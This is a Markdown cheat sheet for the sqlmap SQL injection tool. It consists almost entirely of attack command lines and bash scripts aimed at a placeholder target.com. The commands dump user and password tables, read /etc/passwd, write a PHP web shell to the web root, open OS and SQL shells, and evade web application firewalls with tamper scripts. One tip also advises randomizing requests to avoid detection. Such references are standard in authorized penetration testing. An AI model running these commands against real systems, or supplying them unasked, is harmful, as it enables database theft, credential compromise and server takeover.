# SQLMap - Automated SQL Injection Testing Tool

Advanced SQL injection detection and exploitation tool supporting multiple database management systems.

## Installation

```bash
# Ubuntu/Debian/Kali (usually pre-installed)
apt install sqlmap

# From source
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py

# Python pip
pip install sqlmap
```

## Basic Usage

```bash
# Test single URL parameter
sqlmap -u "http://target.com/page.php?id=1"

# POST data testing
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# Cookie-based injection
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=123; user=admin"

# HTTP header injection
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 1*"
```

## Request Customization

```bash
# Custom headers
sqlmap -u "http://target.com/api" --headers="Authorization: Bearer token123"

# User agent specification
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 Custom"

# HTTP method override
sqlmap -u "http://target.com/api/user/1" --method=PUT

# Request file
sqlmap -r request.txt
```

## Database Enumeration

```bash
# Database detection
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Current user
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Database users
sqlmap -u "http://target.com/page.php?id=1" --users

# User privileges
sqlmap -u "http://target.com/page.php?id=1" --privileges
```

## Table and Column Enumeration

```bash
# List tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C "username,password" --dump

# Dump entire table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
```

## Advanced Enumeration

```bash
# Schema enumeration
sqlmap -u "http://target.com/page.php?id=1" --schema

# Database server banner
sqlmap -u "http://target.com/page.php?id=1" --banner

# Search for databases
sqlmap -u "http://target.com/page.php?id=1" --search -D "user*"

# Search for tables
sqlmap -u "http://target.com/page.php?id=1" --search -T "admin*"

# Search for columns
sqlmap -u "http://target.com/page.php?id=1" --search -C "pass*"
```

## File System Access

```bash
# Read system files
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Write files (if privileges allow)
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS command execution
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Interactive OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

## Authentication Bypass

```bash
# Password hash cracking
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C "username,password" --dump

# Custom wordlist for cracking
sqlmap -u "http://target.com/page.php?id=1" --passwords --common-tables

# Hash format specification
sqlmap -u "http://target.com/page.php?id=1" --dump --hash-format="md5"
```

## Session and Output Management

```bash
# Save session
sqlmap -u "http://target.com/page.php?id=1" -s session.sqlite

# Resume session
sqlmap -u "http://target.com/page.php?id=1" -s session.sqlite --resume

# Output directory
sqlmap -u "http://target.com/page.php?id=1" --output-dir="/tmp/sqlmap"

# Verbose output
sqlmap -u "http://target.com/page.php?id=1" -v 3
```

## Evasion and Performance

```bash
# WAF bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper="between,space2comment"

# Multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,charencode,randomcase"

# Delay between requests
sqlmap -u "http://target.com/page.php?id=1" --delay=2

# Custom timeout
sqlmap -u "http://target.com/page.php?id=1" --timeout=10

# Thread count
sqlmap -u "http://target.com/page.php?id=1" --threads=5
```

## Detection Techniques

```bash
# Risk and level adjustment
sqlmap -u "http://target.com/page.php?id=1" --risk=3 --level=5

# Specific technique
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST

# DBMS specification
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# Force SSL
sqlmap -u "https://target.com/page.php?id=1" --force-ssl
```

## Batch Processing

```bash
# Multiple targets from file
sqlmap -m targets.txt --dbs

# Crawl website
sqlmap -u "http://target.com" --crawl=3

# Forms testing
sqlmap -u "http://target.com" --forms --dbs
```

## Common Tamper Scripts

### Popular evasion scripts:
- `apostrophemask` - Replace apostrophe with UTF-8 character
- `base64encode` - Base64 encode payloads
- `between` - Replace equals with BETWEEN
- `charencode` - URL encode characters
- `equaltolike` - Replace equals with LIKE
- `greatest` - Replace greater than with GREATEST
- `halfversionedmorekeywords` - Add MySQL comments
- `ifnull2ifisnull` - Replace IFNULL with IF ISNULL
- `modsecurityversioned` - Add versioned MySQL comments
- `modsecurityzeroversioned` - Add zero-versioned MySQL comments
- `randomcase` - Random case keywords
- `space2comment` - Replace spaces with comments
- `space2plus` - Replace spaces with plus signs
- `versionedkeywords` - Add MySQL version comments
- `versionedmorekeywords` - Add more MySQL version comments

## Automated Testing Scripts

### Comprehensive assessment
```bash
#!/bin/bash
TARGET_URL="http://target.com/page.php?id=1"
OUTPUT_DIR="/tmp/sqlmap_results"

echo "Starting comprehensive SQL injection assessment..."

# Basic detection
sqlmap -u "$TARGET_URL" --batch --output-dir="$OUTPUT_DIR" --dbs

if [ $? -eq 0 ]; then
    echo "SQL injection confirmed. Proceeding with enumeration..."
    
    # Database enumeration
    sqlmap -u "$TARGET_URL" --batch --current-db --current-user
    
    # Table enumeration
    sqlmap -u "$TARGET_URL" --batch --tables
    
    # User data extraction
    sqlmap -u "$TARGET_URL" --batch --search -T "*user*" --dump
    
    # System information
    sqlmap -u "$TARGET_URL" --batch --banner --is-dba
    
    echo "Assessment complete. Results saved to $OUTPUT_DIR"
else
    echo "No SQL injection vulnerabilities detected."
fi
```

### WAF bypass testing
```bash
#!/bin/bash
URL="http://target.com/page.php?id=1"
TAMPERS=("space2comment" "charencode" "randomcase" "between" "greatest")

for tamper in "${TAMPERS[@]}"; do
    echo "Testing with tamper: $tamper"
    sqlmap -u "$URL" --tamper="$tamper" --batch --dbs --level=2 --risk=2
    
    if [ $? -eq 0 ]; then
        echo "Success with tamper: $tamper"
        break
    fi
done
```

## Integration Examples

### With Burp Suite
1. Capture request in Burp Suite
2. Save request to file
3. Use: `sqlmap -r burp_request.txt`

### With Custom Scripts
```bash
#!/bin/bash
# Process multiple URLs from file
while read url; do
    echo "Testing: $url"
    sqlmap -u "$url" --batch --dbs --random-agent
    sleep 5
done < urls.txt
```

## Best Practices

1. **Always get authorization** before testing
2. **Use batch mode** for automated testing: `--batch`
3. **Randomize requests** to avoid detection: `--random-agent`
4. **Save sessions** for large assessments: `-s session.sqlite`
5. **Use appropriate risk/level** settings based on target
6. **Implement delays** to avoid overwhelming target: `--delay`

Essential tool for comprehensive SQL injection vulnerability assessment and exploitation.
